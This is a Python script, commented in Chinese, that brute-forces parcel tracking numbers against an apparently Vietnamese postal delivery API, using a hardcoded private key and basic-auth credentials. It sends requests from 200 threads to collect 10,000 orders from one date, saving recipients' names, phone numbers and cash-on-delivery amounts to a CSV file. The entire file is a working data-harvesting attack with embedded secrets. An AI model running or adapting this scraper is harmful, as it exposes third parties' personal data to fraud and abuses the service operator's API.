#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
优化扫描 - 先扫描已知高密度区，快速达到10000目标
"""
import hashlib, requests, json, time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading, sys

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TARGET_DATE = "15/10/2025"
print_lock = threading.Lock()
state = {'found': 0, 'tested': 0, 'lock': threading.Lock(), 'start_time': time.time(), 'last_print': 0}
TARGET = 10000

csv_file = f"optimized_10k_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

def init_csv():
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        f.write('运单号,发件日期,收件人,电话,COD,状态,时间\n')

def save_order(tracking, issue, receiver, phone, cod, status):
    try:
        with open(csv_file, 'a', encoding='utf-8-sig') as f:
            f.write(f'{tracking},{issue},{receiver},{phone},{cod},{status},{datetime.now().strftime("%H:%M:%S")}\n')
            f.flush()
    except:
        pass

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def is_today(date_str):
    if not date_str:
        return False
    return ("15/10/2025" in str(date_str) or "10/15/2025" in str(date_str))

def check_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    try:
        with state['lock']:
            state['tested'] += 1
            tested = state['tested']
        
        r = requests.post(
            f"{API_URL}api/Delivery/Inquiry",
            headers={
                "Authorization": f"Basic {BASIC_AUTH}",
                "APIKey": PRIVATE_KEY,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data={"ParcelCode": tracking, "Signature": sign(tracking)},
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get('Code') == '00' and data.get('Value'):
                v = data['Value']
                if is_today(v.get('IssueDate', '')) or is_today(v.get('LoadDate', '')):
                    with state['lock']:
                        state['found'] += 1
                        count = state['found']
                    
                    receiver = v.get('ReceiverName', '')[:15]
                    phone = v.get('ReceiverPhone', '')
                    cod = v.get('CollectAmount', 0)
                    status = "已配送" if v.get('DeliveryDate') else "未配送"
                    
                    elapsed = time.time() - state['start_time']
                    speed = tested / elapsed if elapsed > 0 else 0
                    eta = (TARGET - count) / (count / elapsed) if count > 0 else 0
                    
                    safe_print(f"✅ [{count:,}/{TARGET:,}] {tracking} | {status} | {receiver} | {cod:,}₫ | {speed:.0f}/s | ETA:{eta/60:.0f}分")
                    save_order(tracking, v.get('IssueDate', ''), receiver, phone, cod, status)
                    return True
        
        if tested % 200 == 0:
            with state['lock']:
                if time.time() - state['last_print'] >= 5:
                    state['last_print'] = time.time()
                    elapsed = time.time() - state['start_time']
                    speed = tested / elapsed if elapsed > 0 else 0
                    progress = (state['found'] / TARGET * 100)
                    safe_print(f"📊 已扫{tested:,} | 找到{state['found']:,} ({progress:.1f}%) | {speed:.0f}/s")
    except:
        pass
    return False

# 🔥 优化的扫描顺序：从已知订单区开始
RANGES = [
    # 第1优先级：已知订单密集区 (EP 492.9M-493.1M)
    ('EP', 492900000, 493100000, 1),   # 20万号 - 核心区
    ('EP', 492500000, 492900000, 1),   # 40万号
    ('EP', 493100000, 493500000, 1),   # 40万号
    ('EP', 492000000, 492500000, 1),   # 50万号  
    ('EP', 493500000, 494000000, 1),   # 50万号
    
    # 第2优先级：EF高密度区
    ('EF', 47000000, 48000000, 1),     # 100万号
    ('EF', 43000000, 44000000, 1),     # 100万号
    
    # 第3优先级：EP扩展区
    ('EP', 490000000, 492000000, 1),   # 200万号
    ('EP', 494000000, 496000000, 1),   # 200万号
    
    # 第4优先级：EF扩展区
    ('EF', 40000000, 43000000, 1),     # 300万号
    ('EF', 44000000, 47000000, 1),     # 300万号
    ('EF', 48000000, 50000000, 1),     # 200万号
    
    # 第5优先级：其他系列采样
    ('ED', 40000000, 50000000, 5),
    ('EB', 40000000, 50000000, 5),
    ('EC', 40000000, 50000000, 5),
]

print(f"""
╔═══════════════════════════════════════════════════════════╗
║   ⚡ 优化扫描 - 快速达到{TARGET:,}订单目标        ║
╚═══════════════════════════════════════════════════════════╝

🎯 优化策略（从已知订单区开始）:
  1️⃣ EP 492.9M-493.1M (20万号) - 已知订单核心区！
  2️⃣ EP 492.5M-493.5M (80万号) - 周边扩展
  3️⃣ EP 492M-494M (100万号) - 大范围
  4️⃣ EF 47M-48M, 43M-44M (200万号) - 高密度
  5️⃣ 其他区域
  
⚡ 预计: 在前400万号内找到{TARGET:,}订单
  线程: 200
  预计耗时: 2-4小时

🚀 开始优化扫描...
""")

init_csv()
start = time.time()

with ThreadPoolExecutor(max_workers=200) as executor:
    futures = []
    
    for prefix, st, end, step in RANGES:
        if state['found'] >= TARGET:
            break
        for num in range(st, end, step):
            if state['found'] >= TARGET:
                break
            futures.append(executor.submit(check_order, f"{prefix}{num:09d}VN"))
    
    print(f"已提交{len(futures):,}个任务\n")
    
    for future in as_completed(futures):
        try:
            future.result()
        except:
            pass
        if state['found'] >= TARGET:
            break

elapsed = time.time() - start
print(f"""
{'='*70}
🎉 完成！
找到: {state['found']:,}
测试: {state['tested']:,}
成功率: {state['found']/state['tested']*100:.3f}%
耗时: {elapsed/3600:.2f}小时
文件: {csv_file}
{'='*70}
""")
